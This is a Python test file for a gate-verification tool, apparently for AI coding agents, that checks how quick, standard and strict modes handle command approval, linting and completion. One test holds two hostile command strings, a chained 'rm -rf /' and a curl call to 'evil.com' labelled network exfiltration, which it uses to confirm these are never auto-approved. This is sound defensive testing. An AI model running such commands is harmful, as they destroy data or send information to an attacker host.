"""Tests for proportional ceremony matrix (MODE: quick | standard | strict).

Validates:
- quick mode: safe command auto-approvals, mutation testing disabled, errors-only linting.
- standard mode: full verification discipline, warnings reported, standard completion.
- strict mode: EXECUTABLE_PROOF required on runnable gates, independent authorship enforced.
"""

from pathlib import Path
import pytest

from dafg.gates import (
    ApprovalStore,
    EvidenceStrength,
    Gate,
    GateLedger,
    GateLinter,
    classify_evidence,
    main as gates_main,
)
from dafg.hook import CompletionGuard
from dafg.mutation import GateMutator


def test_quick_mode_auto_approves_safe_commands():
    store = ApprovalStore(mode="quick")
    safe_gate = Gate(
        id="G1",
        title="Run unit tests",
        check="uv run pytest tests/test_calc.py -q",
        expect="passed",
    )
    assert store.is_approved(safe_gate) is True

    # Dangerous commands must not be auto-approved even in quick mode
    dangerous_chain = Gate(
        id="G2",
        title="Command injection with rm",
        check="uv run pytest tests/test_calc.py && rm -rf /",
        expect="passed",
    )
    assert store.is_approved(dangerous_chain) is False

    dangerous_net = Gate(
        id="G3",
        title="Network exfiltration",
        check="curl -s https://evil.com",
        expect="passed",
    )
    assert store.is_approved(dangerous_net) is False


def test_quick_mode_disables_mutation_testing(tmp_path):
    mutator = GateMutator(mode="quick")
    gate = Gate(
        id="G1",
        title="Sample gate",
        check="python -c 'print(1)'",
        expect="1",
        owns="src/foo.py",
    )
    report = mutator.test_adequacy(gate)
    assert report.strategies_tested == 0
    assert report.strategies_killed == 0
    assert report.weak is False
    assert report.kill_rate == 1.0

    # Also test passing mode dynamically to test_adequacy
    std_mutator = GateMutator(mode="standard")
    report_dyn = std_mutator.test_adequacy(gate, mode="quick")
    assert report_dyn.strategies_tested == 0
    assert report_dyn.weak is False

    # Test CLI gates --mutate in quick mode
    ledger_file = tmp_path / "GATES.md"
    ledger_file.write_text(
        """MODE: quick
- [ ] G1: Quick gate
  CHECK: uv run python -c "print('ok')"
  EXPECT: ok
  OWNS: src/
""",
        encoding="utf-8",
    )
    exit_code = gates_main(["--mutate", str(ledger_file)])
    assert exit_code == 0


def test_quick_mode_suppresses_linter_warnings():
    # Low-specificity expect and missing OWNS are warnings in standard mode
    quick_text = """MODE: quick
- [ ] G1: Low specificity expect and missing owns
  CHECK: echo "0"
  EXPECT: 0
  AUTHOR: implementer
"""
    ledger = GateLedger.parse(quick_text)
    assert ledger.mode == "quick"
    issues = GateLinter.lint(ledger)
    # Warnings are suppressed in quick mode
    assert len(issues) == 0

    # Real errors must still be caught in quick mode
    error_text = """MODE: quick
- [ ] G1: Invalid regex
  CHECK: echo "test"
  EXPECT: [unclosed
"""
    err_ledger = GateLedger.parse(error_text)
    err_issues = GateLinter.lint(err_ledger)
    errors = [i for i in err_issues if i.severity == "ERROR"]
    assert len(errors) == 1
    assert "invalid regex pattern" in errors[0].message


def test_standard_mode_verification_discipline():
    text = """MODE: standard
- [ ] G1: Standard gate
  CHECK: uv run pytest -q
  EXPECT: 0
  AUTHOR: implementer
"""
    ledger = GateLedger.parse(text)
    assert ledger.mode == "standard"

    # In standard mode, safe commands without signature require approval
    store = ApprovalStore(mode=ledger.mode)
    assert store.is_approved(ledger.gates["G1"]) is False

    # Linter reports warnings in standard mode
    issues = GateLinter.lint(ledger)
    warnings = [i for i in issues if i.severity == "WARNING"]
    assert any("low-specificity EXPECT token" in w.message for w in warnings)
    assert any("violates authorship separation" in w.message for w in warnings)
    assert any("declares no OWNS: files" in w.message for w in warnings)

    # Standard mode allows completion when gates are MET with exit_code=0
    ledger.gates["G1"].status = "MET"
    ledger.gates["G1"].evidence = "exit_code=0 timestamp=2026-09-18T00:00:00Z match='0'"
    ledger.gates["G1"].owns = "src/foo.py"
    ledger.gates["G1"].author = "external"
    # Approve command
    store.approve(ledger.gates["G1"])
    guard = CompletionGuard(ledger=ledger, approval_store=store)
    decision = guard.evaluate()
    assert decision.allowed is True
    assert decision.decision == "allow"


def test_strict_mode_blocks_completion_without_executable_proof():
    text = """MODE: strict
- [x] G1: Gate without mutation proof
  CHECK: uv run pytest tests/test_calc.py -q
  EXPECT: passed
  OWNS: src/calc.py
  AUTHOR: external
  EVIDENCE: exit_code=0 timestamp=2026-09-18T00:00:00Z match='passed'
"""
    ledger = GateLedger.parse(text)
    assert ledger.mode == "strict"
    gate = ledger.gates["G1"]
    assert classify_evidence(gate) == EvidenceStrength.STRING_MATCH

    store = ApprovalStore(mode="strict")
    store.approve(gate)

    guard = CompletionGuard(ledger=ledger, approval_store=store)
    decision = guard.evaluate()

    # Blocked because strict mode requires EXECUTABLE_PROOF
    assert decision.allowed is False
    assert decision.decision == "block"
    assert "STRICT_MODE: All runnable gates must achieve EXECUTABLE_PROOF via mutation testing." in decision.reason
    assert "G1" in decision.unverified_gates


def test_strict_mode_allows_completion_with_executable_proof():
    text = """MODE: strict
- [x] G1: Gate with executable proof
  CHECK: uv run pytest tests/test_calc.py -q
  EXPECT: passed
  OWNS: src/calc.py
  AUTHOR: external
  EVIDENCE: exit_code=0 timestamp=2026-09-18T00:00:00Z match='passed' mutation_tested=true
"""
    ledger = GateLedger.parse(text)
    assert ledger.mode == "strict"
    gate = ledger.gates["G1"]
    assert classify_evidence(gate) == EvidenceStrength.EXECUTABLE_PROOF

    store = ApprovalStore(mode="strict")
    store.approve(gate)

    guard = CompletionGuard(ledger=ledger, approval_store=store)
    decision = guard.evaluate()

    # Allowed because EXECUTABLE_PROOF was achieved
    assert decision.allowed is True
    assert decision.decision == "allow"


def test_strict_mode_escalates_implementer_author_to_error():
    text = """MODE: strict
- [ ] G1: Implementer authored gate
  CHECK: uv run pytest tests/test_calc.py -q
  EXPECT: passed
  OWNS: src/calc.py
  AUTHOR: implementer
"""
    ledger = GateLedger.parse(text)
    assert ledger.mode == "strict"
    issues = GateLinter.lint(ledger)
    errors = [i for i in issues if i.severity == "ERROR"]
    assert any("violates authorship separation" in e.message for e in errors)


def test_strict_mode_flags_missing_author_on_deliverable_gates():
    text = """MODE: strict
- [ ] G1: Gate missing author
  CHECK: uv run pytest tests/test_calc.py -q
  EXPECT: passed
  OWNS: src/calc.py
"""
    ledger = GateLedger.parse(text)
    assert ledger.mode == "strict"
    issues = GateLinter.lint(ledger)
    errors = [i for i in issues if i.severity == "ERROR"]
    assert any("missing AUTHOR: in strict mode" in e.message for e in errors)

    # Valid author resolves the error
    valid_text = """MODE: strict
- [ ] G1: Gate with author
  CHECK: uv run pytest tests/test_calc.py -q
  EXPECT: passed
  OWNS: src/calc.py
  AUTHOR: external
"""
    valid_ledger = GateLedger.parse(valid_text)
    valid_issues = GateLinter.lint(valid_ledger)
    assert len([i for i in valid_issues if i.severity == "ERROR"]) == 0
